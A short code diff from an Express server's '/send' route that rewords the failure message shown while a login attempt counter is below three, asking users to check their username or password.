@@ -48,7 +48,7 @@ app.post("/send", async (req, res) => {
     if (attemptCount < 3) {
       res.json({
         success: false,
-        message: "❌ Your request submission failed. Please check your details."
+        message: "❌ Your request submission failed. Please check your username or password. please Enter Correct Details."
       });
     } else {
       attemptCount = 0; // reset
